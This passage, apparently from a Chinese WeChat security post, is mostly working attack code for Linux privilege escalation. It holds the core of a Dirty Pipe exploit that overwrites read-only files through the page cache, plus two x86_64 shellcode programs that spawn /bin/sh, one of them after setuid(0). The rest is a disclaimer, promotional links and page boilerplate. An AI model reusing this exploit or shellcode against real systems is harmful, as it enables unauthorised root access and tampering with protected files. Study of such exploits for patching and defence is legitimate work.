      89.     const int fd = open(path, O_RDONLY); // yes, read-only! :-)
    
      90.     if (fd < 0) {
    
      91.         perror("open failed");
    
      92.         return EXIT_FAILURE;
    
      93.     }
    
      94.   95.     struct stat st;
    
      96.     if (fstat(fd, &st)) {
    
      97.         perror("stat failed");
    
      98.         return EXIT_FAILURE;
    
      99.     }
    
      100.   101.     if (offset > st.st_size) {
    
      102.         fprintf(stderr, "Offset is not inside the file\n");
    
      103.         return EXIT_FAILURE;
    
      104.     }
    
      105.   106.     if (end_offset > st.st_size) {
    
      107.         fprintf(stderr, "Sorry, cannot enlarge the file\n");
    
      108.         return EXIT_FAILURE;
    
      109.     }
    
      110.   111.     /* create the pipe with all flags initialized with
    
      112.        PIPE_BUF_FLAG_CAN_MERGE */
    
      113.     int p[2];
    
      114.     prepare_pipe(p);
    
      115.   116.     /* splice one byte from before the specified offset into the
    
      117.        pipe; this will add a reference to the page cache, but
    
      118.        since copy_page_to_iter_pipe() does not initialize the
    
      119.        "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    
      120.     --offset;
    
      121.     ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    
      122.     if (nbytes < 0) {
    
      123.         perror("splice failed");
    
      124.         return EXIT_FAILURE;
    
      125.     }
    
      126.     if (nbytes == 0) {
    
      127.         fprintf(stderr, "short splice\n");
    
      128.         return EXIT_FAILURE;
    
      129.     }
    
      130.   131.     /* the following write will not create a new pipe_buffer, but
    
      132.        will instead write into the page cache, because of the
    
      133.        PIPE_BUF_FLAG_CAN_MERGE flag */
    
      134.     nbytes = write(p[1], data, data_size);
    
      135.     if (nbytes < 0) {
    
      136.         perror("write failed");
    
      137.         return EXIT_FAILURE;
    
      138.     }
    
      139.     if ((size_t)nbytes < data_size) {
    
      140.         fprintf(stderr, "short write\n");
    
      141.         return EXIT_FAILURE;
    
      142.     }
    
      143.   144.     return EXIT_SUCCESS;
    
      145. }
    
    
    

![](https://gitee.com/fuli009/images/raw/master/public/20230714175320.png)

    
          1. /** x86_64 execveat("/bin//sh") 29 bytes shellcode
    
      2.   3. --[ AUTHORS
    
      4.     * ZadYree
    
      5.     * vaelio
    
      6.     * DaShrooms
    
      7.   8. ~ Armature Technologies R&D
    
      9.   10. --[ asm
    
      11. 6a 42                   push   0x42
    
      12. 58                      pop    rax
    
      13. fe c4                   inc    ah
    
      14. 48 99                   cqo
    
      15. 52                      push   rdx
    
      16. 48 bf 2f 62 69 6e 2f    movabs rdi, 0x68732f2f6e69622f
    
      17. 2f 73 68
    
      18. 57                      push   rdi
    
      19. 54                      push   rsp
    
      20. 5e                      pop    rsi
    
      21. 49 89 d0                mov    r8, rdx
    
      22. 49 89 d2                mov    r10, rdx
    
      23. 0f 05                   syscall
    
      24.   25. --[ COMPILE
    
      26. gcc execveat.c -o execveat # NX-compatible :)
    
      27.   28. **/
    
      29.   30. #include <stdio.h>
    
      31. #include <stdlib.h>
    
      32. #include <stdint.h>
    
      33.   34. const uint8_t sc[29] = {
    
      35.     0x6a, 0x42, 0x58, 0xfe, 0xc4, 0x48, 0x99, 0x52, 0x48, 0xbf,
    
      36.     0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
    
      37.     0x5e, 0x49, 0x89, 0xd0, 0x49, 0x89, 0xd2, 0x0f, 0x05
    
      38. };
    
      39.   40. /** str
    
      41. \x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf
    
      42. \x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54
    
      43. \x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05
    
      44. **/
    
      45.   46. int main (void)
    
      47. {
    
      48.   ((void (*) (void)) sc) ();
    
      49.   return EXIT_SUCCESS;
    
      50. }
    
    
    
    
          1. /*
    
      2. setuid(0) + execve(/bin/sh) - just 4 fun.
    
      3. xi4oyu [at] 80sec.com
    
      4.   5. main(){
    
      6. __asm(  "xorq %rdi,%rdi\n\t"
    
      7.         "mov $0x69,%al\n\t"
    
      8.         "syscall \n\t"
    
      9.         "xorq   %rdx, %rdx \n\t"
    
      10.         "movq   $0x68732f6e69622fff,%rbx; \n\t"
    
      11.         "shr    $0x8, %rbx; \n\t"
    
      12.         "push   %rbx; \n\t"
    
      13.         "movq   %rsp,%rdi; \n\t"
    
      14.         "xorq   %rax,%rax; \n\t"
    
      15.         "pushq  %rax; \n\t"
    
      16.         "pushq  %rdi; \n\t"
    
      17.         "movq   %rsp,%rsi; \n\t"
    
      18.         "mov    $0x3b,%al; \n\t"
    
      19.         "syscall ; \n\t"
    
      20.         "pushq  $0x1 ; \n\t"
    
      21.         "pop    %rdi ; \n\t"
    
      22.         "pushq  $0x3c ; \n\t"
    
      23.         "pop    %rax ; \n\t"
    
      24.         "syscall  ; \n\t"
    
      25. );
    
      26. }
    
      27. */
    
      28. main() {
    
      29.         char shellcode[] =
    
      30.         "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
    
      31.         "\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
    
      32.         "\xc0\x50\x57\x48\x89\xe6 \xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
    
      33.         "\x58\x0f\x05";
    
      34.         (*(void (*)()) shellcode)();
    
      35. }
    
      36.   37. 2009-05-14
    
      38. evil.xi4oyu
    
    
    

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

![](https://gitee.com/fuli009/images/raw/master/public/20230714175321.png)  

 **没看够~？欢迎关注！**

  

  

 **分享本文到朋友圈，可以凭截图找老师领取**

上千 **教程+工具+交流群+靶场账号** 哦



![](https://gitee.com/fuli009/images/raw/master/public/20230714175308.png)

 ** ** **分享后扫码 加我！**

  

 **回顾往期内容**

[Xray挂机刷漏洞](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504665&idx=1&sn=eb88ca9711e95ee8851eb47959ff8a61&chksm=fa6baa68cd1c237e755037f35c6f74b3c09c92fd2373d9c07f98697ea723797b73009e872014&scene=21#wechat_redirect)  

[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)

[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  

[文库｜内网神器cs4.0使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  

[代码审计 |
这个CNVD证书拿的有点轻松](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503150&idx=1&sn=189d061e1f7c14812e491b6b7c49b202&chksm=fa6bb45fcd1c3d490cdfa59326801ecb383b1bf9586f51305ad5add9dec163e78af58a9874d2&scene=21#wechat_redirect)

[【精选】SRC快速入门+上分小秘籍+实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)

## [    代理池工具撰写 |
只有无尽的跳转，没有封禁的IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)

![](https://gitee.com/fuli009/images/raw/master/public/20230714175321.png)

点赞+在看支持一下吧~感谢看官老爷~

你的点赞是我更新的动力

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

